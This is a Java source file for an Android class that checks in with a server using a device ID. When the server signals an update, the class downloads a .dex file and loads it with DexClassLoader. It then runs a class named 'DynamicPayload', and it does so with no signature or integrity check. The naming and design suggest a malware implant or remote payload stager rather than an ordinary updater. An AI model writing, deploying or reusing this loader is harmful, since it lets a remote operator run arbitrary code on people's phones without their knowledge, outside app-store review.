// This class handles update checking and loading .dex payloads dynamically

package com.mobilemorph.agent;
import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;
import dalvik.system.DexClassLoader;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class AgentUpdateManager {
    private static final String TAG = "AgentUpdate";
    private static final String CHECK_UPDATE_URL = "https://127.0.0.1:5000/check_update";
    private static final String PAYLOAD_BASE_URL = "https://127.0.0.1:5000/payloads/";
    private static final String DEVICE_ID = "MOBILEMORPH-001"; // replace with dynamic device ID

    public static void checkForUpdate(Context context) {
        new AsyncTask<Void, Void, String>() {
            @Override
            protected String doInBackground(Void... voids) {
                try {
                    URL url = new URL(CHECK_UPDATE_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    String payload = "{\"device_id\":\"" + DEVICE_ID + "\"}";
                    conn.getOutputStream().write(payload.getBytes());

                    InputStream in = new BufferedInputStream(conn.getInputStream());
                    StringBuilder sb = new StringBuilder();
                    int ch;
                    while ((ch = in.read()) != -1) sb.append((char) ch);
                    return sb.toString();
                } catch (Exception e) {
                    Log.e(TAG, "Update check failed", e);
                    return null;
                }
            }

            @Override
            protected void onPostExecute(String response) {
                if (response == null || !response.contains("update")) return;
                if (response.contains("\"update\":true")) {
                    String filename = response.split("\"filename\":\"")[1].split("\"", 2)[0];
                    downloadAndLoadDex(context, filename);
                }
            }
        }.execute();
    }

    private static void downloadAndLoadDex(Context context, String filename) {
        new AsyncTask<Void, Void, File>() {
            @Override
            protected File doInBackground(Void... voids) {
                try {
                    URL dexUrl = new URL(PAYLOAD_BASE_URL + filename);
                    HttpURLConnection conn = (HttpURLConnection) dexUrl.openConnection();
                    conn.connect();
                    File outDex = new File(context.getCacheDir(), filename);
                    try (InputStream in = conn.getInputStream(); FileOutputStream out = new FileOutputStream(outDex)) {
                        byte[] buffer = new byte[1024];
                        int len;
                        while ((len = in.read(buffer)) > 0) out.write(buffer, 0, len);
                    }
                    return outDex;
                } catch (Exception e) {
                    Log.e(TAG, "DEX download failed", e);
                    return null;
                }
            }

            @Override
            protected void onPostExecute(File dexFile) {
                if (dexFile == null) return;
                try {
                    File optimizedDir = context.getDir("dex", Context.MODE_PRIVATE);
                    DexClassLoader loader = new DexClassLoader(
                            dexFile.getAbsolutePath(),
                            optimizedDir.getAbsolutePath(),
                            null,
                            context.getClassLoader()
                    );

                    Class<?> loadedClass = loader.loadClass("com.mobilemorph.payload.DynamicPayload");
                    Runnable task = (Runnable) loadedClass.newInstance();
                    task.run();
                    Log.i(TAG, "Dynamic payload executed");
                } catch (Exception e) {
                    Log.e(TAG, "DEX execution failed", e);
                }
            }
        }.execute();
    }
}
